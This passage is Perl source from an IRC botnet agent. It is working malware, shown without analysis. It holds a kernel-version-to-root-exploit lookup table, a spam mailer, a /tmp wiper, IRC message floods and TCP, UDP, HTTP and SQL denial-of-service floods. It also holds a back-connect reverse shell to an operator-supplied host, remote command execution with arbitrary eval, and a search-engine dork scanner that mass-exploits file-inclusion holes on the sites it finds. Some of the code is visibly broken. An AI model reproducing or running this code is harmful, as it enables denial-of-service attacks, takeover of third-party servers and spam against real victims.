      vuln=>['2.4.20','2.2.25','2.4.24'] 
   };
   
   $h{'newlocal'} = {
      vuln=>['2.4.17','2.4.19','2.4.18'] 
   };
   
   $h{'ong_bak'} = {
      vuln=>['2.4.','2.6.'] 
   };
   
   $h{'ptrace'} = {
      vuln=>['2.2.','2.4.22'] 
   };
   
   $h{'ptrace_kmod'} = {
      vuln=>['2.4.2'] 
   };
   
   $h{'ptrace24'} = {
      vuln=>['2.4.9'] 
   };
   
   $h{'pwned'} = {
      vuln=>['2.4.','2.6.'] 
   };
   
   $h{'py2'} = {
      vuln=>['2.6.9','2.6.17','2.6.15','2.6.13'] 
   };
   
   $h{'raptor_prctl'} = {
      vuln=>['2.6.13','2.6.17','2.6.16','2.6.13'] 
   };
   
   $h{'prctl3'} = {
      vuln=>['2.6.13','2.6.17','2.6.9'] 
   };
   
   $h{'remap'} = {
      vuln=>['2.4.'] 
   };
   
   $h{'rip'} = {
      vuln=>['2.2.'] 
   };
   
   $h{'stackgrow2'} = {
      vuln=>['2.4.29','2.6.10'] 
   };
   
   $h{'uselib24'} = {
      vuln=>['2.4.29','2.6.10','2.4.22','2.4.25'] 
   };
   
   $h{'newsmp'} = {
      vuln=>['2.6.'] 
   };
   
   $h{'smpracer'} = {
      vuln=>['2.4.29'] 
   };
   
   $h{'loginx'} = {
      vuln=>['2.4.22'] 
   };
   
   $h{'exp.sh'} = {
      vuln=>['2.6.9','2.6.10','2.6.16','2.6.13'] 
   };
   
   $h{'prctl'} = {
      vuln=>['2.6.'] 
   };
   
   $h{'kmdx'} = {
      vuln=>['2.6.','2.4.'] 
   };
   
   $h{'raptor'} = {
      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16'] 
   };
   
   $h{'raptor2'} = {
      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16'] 
   };
   
foreach my $key(keys %h){
foreach my $kernel ( @{ $h{$key}{'vuln'} } ){ 
   if($khost=~/^$kernel/){
   chop($kernel) if ($kernel=~/.$/);
   sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Rootable12] Possible Local Root Exploits: ". $key ." ");
      }
   }
}
}
######################
#       MAILER       # 
######################
if ($funcarg =~ /^sendmail\s+(.*)\s+(.*)\s+(.*)\s+(.*)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Mailer12]  Mailer :. |  Sending Mail to : 2 $3");
$subject = $1;
$sender = $2;
$recipient = $3;
@corpo = $4;
$mailtype = "content-type: text/html";
$sendmail = '/usr/sbin/sendmail';
open (SENDMAIL, "| $sendmail -t");
print SENDMAIL "$mailtype\n";
print SENDMAIL "Subject: $subject\n";
print SENDMAIL "From: $sender\n";
print SENDMAIL "To: $recipient\n\n";
print SENDMAIL "@corpo\n\n";
close (SENDMAIL);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Mailer12]   Mailer :. |  Mail Sent To : 2 $recipient");
}
######################
#   End of MAILER    # 
######################
# A /tmp cleaner
if ($funcarg =~ /^cleartmp/) { 
    system 'cd /tmp;rm -rf *';
         sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3TMPCleaner12] /tmp is Cleaned");
         }
#-#-#-#-#-#-#-#-#
# Flooders IRC  #
#-#-#-#-#-#-#-#-#         
# msg, @msgflood <who>
if ($funcarg =~ /^msgflood (.+?) (.*)/) {
   for($i=0; $i<=10; $i+=1){
      sendraw($IRC_cur_socket, "PRIVMSG ".$1." ".$2);
   }
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3MSGFlood12]14 Excecuted on ".$1." ");
}
         
# dccflood, @dccflood <who>
if ($funcarg =~ /^dccflood (.*)/) {
   for($i=0; $i<=10; $i+=1){
      sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001DCC CHAT chat 1121485131 1024\001\n");
   }
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3DCCFlood12]14 Excecuted on ".$1." ");
}      
# ctcpflood, @ctcpflood <who>
if ($funcarg =~ /^ctcpflood (.*)/) {
   for($i=0; $i<=10; $i+=1){
      sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001VERSION\001\n");
      sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001PING\001\n");
   }
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3CTCPFlood12]14 Excecuted on ".$1." ");
}      
# noticeflood, @noticeflood <who>
   if ($funcarg =~ /^noticeflood (.*)/) {
      for($i=0; $i<=10; $i+=1){
         sendraw($IRC_cur_socket, "NOTICE ".$1." :w3tFL00D\n");
   }
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3NoticeFlood12]14 Excecuted on ".$1." ");
}      
# Channel Flood, @channelflood
if ($funcarg =~ /^channelflood/) {
   for($i=0; $i<=25; $i+=1){ 
      sendraw($IRC_cur_socket, "JOIN #".(int(rand(99999))) );
   }
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3ChannelFlood12]14 Excecuted ");
}
# Maxi Flood, @maxiflood
if ($funcarg =~ /^maxiflood(.*)/) {
   for($i=0; $i<=15; $i+=1){
         sendraw($IRC_cur_socket, "NOTICE ".$1." :w3tFl00D\n");
         sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001VERSION\001\n");
         sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001PING\001\n");
         sendraw($IRC_cur_socket, "PRIVMSG ".$1." :w3tFl00D\n");         
   }
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3M4Xi-Fl00d12]14 Excecuted on ".$1." ");
}
######################
#  irc    #
######################
         if ($funcarg =~ /^reset/) {
            sendraw($IRC_cur_socket, "QUIT :");
         }
         if ($funcarg =~ /^join (.*)/) {
            sendraw($IRC_cur_socket, "JOIN ".$1);
         }
         if ($funcarg =~ /^part (.*)/) {
            sendraw($IRC_cur_socket, "PART ".$1);
         }
         if ($funcarg =~ /^voice (.*)/) { 
            sendraw($IRC_cur_socket, "MODE $printl +v ".$1);
           }
         if ($funcarg =~ /^devoice (.*)/) { 
            sendraw($IRC_cur_socket, "MODE $printl -v ".$1);
           }
         if ($funcarg =~ /^halfop (.*)/) { 
            sendraw($IRC_cur_socket, "MODE $printl +h ".$1);
           }
         if ($funcarg =~ /^dehalfop (.*)/) { 
            sendraw($IRC_cur_socket, "MODE $printl -h ".$1);
           }
         if ($funcarg =~ /^owner (.*)/) { 
            sendraw($IRC_cur_socket, "MODE $printl +q ".$1);
           }
         if ($funcarg =~ /^deowner (.*)/) { 
            sendraw($IRC_cur_socket, "MODE $printl -q ".$1);
         }
         if ($funcarg =~ /^op (.*)/) { 
            sendraw($IRC_cur_socket, "MODE $printl +o ".$1);
           }         
         if ($funcarg =~ /^deop (.*)/) { 
            sendraw($IRC_cur_socket, "MODE $printl -o ".$1);
           }
######################
#End of Join And Part#
######################
######################
#     TCPFlood       #
######################

         if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3TCP-DDOS12] Attacking 4 ".$1.":".$2." 12for 4 ".$3." 12seconds.");
            my $itime = time;
            my ($cur_time);
            $cur_time = time - $itime;
            while ($3>$cur_time){
               $cur_time = time - $itime;
               &tcpflooder("$1","$2","$3");
            }
            sendraw($IRC_cur_socket,"PRIVMSG $printl :12[4@3TCP-DDOS12] Attack done 4 ".$1.":".$2.".");
         }
######################
#  End of TCPFlood   #
######################
######################
#               SQL Fl00dEr                     #
######################
if ($funcarg =~ /^sqlflood\s+(.*)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SQL-DDOS12] Attacking 4 ".$1." 12 on port 3306 for 4 ".$2." 12 seconds .");
my $itime = time;
my ($cur_time);
$cur_time = time - $itime;
while ($2>$cur_time){
$cur_time = time - $itime;
   my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>3306);
   print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
close($socket);
}
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SQL-DDOS12] Attacking done 4 ".$1.".");
}
######################
#   Back Connect     #

######################
         if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
            my $host = "$1";
            my $porta = "$2";
            my $proto = getprotobyname('tcp');
            my $iaddr = inet_aton($host);
            my $paddr = sockaddr_in($porta, $iaddr);
            my $shell = "/bin/sh -i";
            if ($^O eq "MSWin32") {
               $shell = "cmd.exe";
            }
            socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
            connect(SOCKET, $paddr) or die "connect: $!";
            open(STDIN, ">&SOCKET");
            open(STDOUT, ">&SOCKET");
            open(STDERR, ">&SOCKET");
            system("$shell");
            close(STDIN);
            close(STDOUT);
            close(STDERR);
            if ($estatisticas){
               sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Back-Connect12] Connecting to 4 $host:$porta");
            }
         }
######################
#End of  Back Connect#
######################
######################
#    MULTI SCANNER   #
######################
if ($funcarg =~ /^multiscan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
                  my ($type,$space);
                  my %hosts;
                  ### Start Message
                  sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Multi-Scan12] Starting Scan for 4$bug $dork");
                  sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Multi-Scan12] Initializing on 45 12Search Engines ");
                  ### End of Start Message
# Starting Google
   my @glist=&google($dork);
sendraw($IRC_cur_socket, "PRIVMSG $printl 7[4@3Multi-Scan12] 2G4o8o2g3l4e 7[".scalar(@glist)."7] Sites");
   my @mlist=&msn($dork);
   my @asklist=&ask($dork);
   my @allist=&alltheweb($dork);
   my @aollist=&aol($dork);
   my @lycos=&lycos($dork);
   my @ylist=&yahoo($dork);
   my @mzlist=&mozbot($dork);
   my @mamalist&mamma($dork);
   my @hlist=&hotbot($dork);
   my @altlist=&altavista($dork);
   my @slist=&search($dork);
   my @ulist=&uol($dork);
   my @fireball=&fireball($dork);
sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 2G4o8o2g3l4e 7[".scalar(@glist)."7] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 MSN 7[".scalar(@mlist)."7] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 AllTheWeb 7[".scalar(@allist)."7] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 Ask.com 7[".scalar(@asklist)."7] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 AOL 7[".scalar(@aollist)."7] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 Lycos 7[".scalar(@lycos)."7] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 Yahoo! 7[".scalar(@ylist)."7] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 MozBot 7[".scalar(@mzlist)."7] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 Mama 7[".scalar(@mamalist)."7] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 HotBot 7[".scalar(@hlist)."7] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 Altavista 7[".scalar(@altlist)."7] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 Search[dot]com 7[".scalar(@slist)."7] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 UoL 7[".scalar(@ulist)."7] Sites");
sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 FireBall 7[".scalar(@flist)."7] Sites");
#
push(my @tot, @glist, @mlist, @alist, @allist, @asklist, @aollist, @lycos, @ylist, @mzlist, @mamalist, @hlist,@altlist, @slist, @ulist, @flist );
my @puliti=&unici(@tot);
sendraw($IRC_cur_socket, "PRIVMSG $printl 7[4@3Multi-Scan12]  Results: Total:7[".scalar(@tot)."7] Sites and Cleaned: 7[".scalar(@puliti)."7] for $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
sendraw($IRC_cur_socket, "PRIVMSG $printl 7[4@3Multi-Scan12] Exploiting  7[".$contatore."7]  of  7[".$uni. "7] Sites");
}
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $printl 7[4@3Multi-Scan12] Finished for  $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(4);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl 7[4@3Multi-Scan12]  Safe Mode = OFF :. | Vuln:  $print ");
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
sendraw($IRC_cur_socket, "PRIVMSG $printl 7[4@3Multi-Scan12]  Safe Mode =  ON :. | Vuln:  $print  ");
}}
}}}
exit;
}}}
######################
#End of MultiSCANNER #
######################
######################
#     HTTPFlood      #
######################
         if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3HTTP DDoS12:.4|12 Attacking 4 ".$1." 12 on port 80 for 4 ".$2." 12 seconds .");
            my $itime = time;
            my ($cur_time);
            $cur_time = time - $itime;
            while ($2>$cur_time){
               $cur_time = time - $itime;
               my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
               print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
               close($socket);
            }
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3HTTP DDoS12:.4|12 Attacking done 4 ".$1.".");
         }
######################
#  End of HTTPFlood  #
######################
######################
#     UDPFlood       #
######################
         if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3UDP DDoS12:.4|12 Attacking 4 ".$1." 12 with 4 ".$2." 12 Kb Packets for 4 ".$3." 12 seconds.");
            my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
            $dtime = 1 if $dtime == 0;
            my %bytes;
            $bytes{igmp} = $2 * $pacotes{igmp};
            $bytes{icmp} = $2 * $pacotes{icmp};
            $bytes{o} = $2 * $pacotes{o};
            $bytes{udp} = $2 * $pacotes{udp};
            $bytes{tcp} = $2 * $pacotes{tcp};
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3UDP-DDos12]12 12Results4 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 12Kb in4 ".$dtime." 12seconds to4 ".$1.".");
         }
######################
#  End of Udpflood   #
######################
         exit;
      }
   }

sub ircase {
   my ($kem, $printl, $case) = @_;
   if ($case =~ /^join (.*)/) {
      j("$1");
   }
   if ($case =~ /^part (.*)/) {
      p("$1");
   }
   if ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
         for (my $ca = 1; $ca <= $1; $ca++ ) {
            p("$2");
            j("$2");
         }
      } else {
         p("$chan");
         j("$chan");
      }
   }

   if ($case =~ /^op/) {
      op("$printl", "$kem") if $case eq "op";
      my $oarg = substr($case, 3);
      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }

   if ($case =~ /^deop/) {
      deop("$printl", "$kem") if $case eq "deop";
      my $oarg = substr($case, 5);
      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }

   if ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1", "$2");
   }

   if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
         msg("$2", "$3");
      }
   }

   if ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1", "$2");
   }

   if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
         ctcp("$2", "$3");
      }
   }

   if ($case =~ /^nick (.*)/) {
      nick("$1");
   }

   if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
      conectar("$2", "$1", 6667);
   }

   if ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }

   if ($case =~ /^eval (.*)/) {
      eval "$1";
   }
}

sub get_html() {
$test=$_[0];

      $ip=$_[1];
      $port=$_[2];

my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
if(defined($ip) && defined($port)) {
      $ua->proxy("http","http://$ip:$port/");
      $ua->agent("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
}
$ua->timeout(1);
my $response=$ua->request($req);
if ($response->is_success) {
   $re=$response->content;
}
return $re;
}

sub addproc {

   my $proc=$_[0];
   my $dork=$_[1];
   
   open(FILE,">>/var/tmp/pids");
   print FILE $proc." [".$irc_servers{$IRC_cur_socket}{'nick'}."] $dork\n";
   close(FILE);
}


sub delproc {

   my $proc=$_[0];
   open(FILE,"/var/tmp/pids");

   while(<FILE>) {
      $_ =~ /(\d+)\s+(.*)/;
      $childs{$1}=$2;
   }
   close(FILE);
   delete($childs{$proc});

   open(FILE,">/var/tmp/pids");

   for $klucz (keys %childs) {
      print FILE $klucz." ".$childs{$klucz}."\n";
   }
}

sub shell {
   my $printl=$_[0];
   my $comando=$_[1];
   if ($comando =~ /cd (.*)/) {
      chdir("$1") || msg("$printl", "No such file or directory");
      return;
   } elsif ($pid = fork) {
      waitpid($pid, 0);
   } else {
      if (fork) {
         exit;
      } else {
         my @resp=`$comando 2>&1 3>&1`;
         my $c=0;
         foreach my $linha (@resp) {
            $c++;
            chop $linha;
            sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
            if ($c == "$linas_max") {
               $c=0;
               sleep $sleep;
            }
         }
         exit;
      }
   }
}

sub tcpflooder {
   my $itime = time;
   my ($cur_time);
   my ($ia,$pa,$proto,$j,$l,$t);
   $ia=inet_aton($_[0]);
   $pa=sockaddr_in($_[1],$ia);
   $ftime=$_[2];
   $proto=getprotobyname('tcp');
   $j=0;$l=0;
   $cur_time = time - $itime;
   while ($l<1000){
      $cur_time = time - $itime;
      last if $cur_time >= $ftime;
      $t="SOCK$l";
      socket($t,PF_INET,SOCK_STREAM,$proto);
      connect($t,$pa)||$j--;
      $j++;
      $l++;
   }
   $l=0;
   while ($l<1000){
      $cur_time = time - $itime;
      last if $cur_time >= $ftime;
      $t="SOCK$l";
      shutdown($t,2);
      $l++;
   }
}

sub udpflooder {
   my $iaddr = inet_aton($_[0]);
   my $msg = 'A' x $_[1];
   my $ftime = $_[2];
   my $cp = 0;
   my (%pacotes);
   $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
   socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
   socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
   socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
   socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
   return(undef) if $cp == 4;
   my $itime = time;
   my ($cur_time);
   while ( 1 ) {
      for (my $porta = 1; $porta <= 65000; $porta++) {
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
         send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
         send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
         send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;
         for (my $pc = 3; $pc <= 255;$pc++) {
            next if $pc == 6;
            $cur_time = time - $itime;
            last if $cur_time >= $ftime;
            socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
            send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
         }
      }
      last if $cur_time >= $ftime;
   }
   return($cur_time, %pacotes);
}

sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}

sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}

sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}

sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}

sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}

sub j {
   &join(@_);
}

sub join {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}

sub p {
   part(@_);
}

sub part {
   sendraw("PART $_[0]");
}

sub nick {
   return unless $#_ == 0;
   sendraw("NICK $_[0]");
}

sub quit {
   sendraw("QUIT :$_[0]");
}

sub fetch(){
   my $rnd=(int(rand(9999)));
   my $n= 80;
   if ($rnd<5000) {
      $n<<=1;
   }
   my $s= (int(rand(10)) * $n);
   my @dominios = ("removed-them-all");
   my @str;
   foreach $dom  (@dominios){
      push (@str,"@gstring");
   }
   my $query="www.google.com/search?q=";
   $query.=$str[(rand(scalar(@str)))];
   $query.="&num=$n&start=$s";
   my @lst=();
   sendraw("privmsg #debug :DEBUG only test googling: ".$query."");
   my $page = http_query($query);
   while ($page =~  m/<a href=\"?http:\/\/([^>\"]+)\"? class=l>/g){
      if ($1 !~ m/google|cache|translate/){
         push (@lst,$1);
      }
   }
   return (@lst);

sub yahoo(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=100){
my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub msn(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $msn=("http://search.msn.de/results.aspx?q=".key($key)."&first=".$b."&FORM=PORE");
my $Res=query($msn);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub lycos(){
my $inizio=0;
my $pagine=20;
my $key=$_[0];
my $av=0;
my @lst;
while($inizio <= $pagine){
my $lycos="http://search.lycos.com/?query=".key($key)."&page=$av";
my $Res=query($lycos);
while ($Res=~ m/<span class=\"?grnLnk small\"?>http:\/\/(.+?)\//g ){
my $k="$1";
my @grep=links($k);
push(@lst,@grep);
}
$inizio++;
$av++;
}
return @lst;
}

#####
sub aol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=100;$b++){
my $AoL=("http://search.aol.com/aol/search?query=".key($key)."&page=".$b."&nt=null&ie=UTF-8");
my $Res=query($AoL);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}
#####
sub ask(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10)
{
my $Ask=("http://it.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
my $k=$3;
$k=~s/[\"\ ]//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}
#####
sub alltheweb()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100)
{
my $all=("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
my $Res=query($all);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub google(){
my @lst;
my $key = $_[0];
for($b=0;$b<=100;$b+=100){
my $Go=("http://www.google.it/search?hl=it&q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# SUBS SEARCH
#####
sub search(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $ser=("http://www.search.com/search?q=".key($key)."".$b);
my $Res=query($ser);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# SUBS FireBall
#####
sub fireball(){
my $key=$_[0];
my $inicio=1;
my $pagina=200;
my @lst;
my $av=0;
while($inicio <= $pagina){
my $fireball="http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=fb_loc&idx=all&enc=utf-8";
my $Res=query($fireball);
while ($Res=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /msn|live|google|yahoo/){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
$av=$av+10;
$inicio++;
}
return @lst;
}
#####
# SUBS UOL
#####
sub uol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $UoL=("http://busca.uol.com.br/www/index.html?q=".key($key)."&start=".$i);
my $Res=query($UoL);
while($Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){
my $k=$1;
if($k!~/busca|uol|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# Altavista
#####
sub altavista(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavistade(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://de.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavistaus(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://us.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# HotBot
#####
sub hotbot(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $hot=("http://search.hotbot.de/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=hb_loc&enc=utf-8".$b);
my $Res=query($hot);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}


#####
# Mamma
#####
sub mamma(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $mam=("http://www.mamma.com/Mamma?utfout=$av&qtype=0&query=".key($key)."".$b);
my $Res=query($mam);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# MozBot
#####
sub mozbot()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=100; $i+=1){
my $mozbot=("http://www.mozbot.fr/search?q=".key($key)."&st=int&page=".$i);
my $Res=query($mozbot);
while($Res =~ m/<a href=\"?http:\/\/(.+?)\" target/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
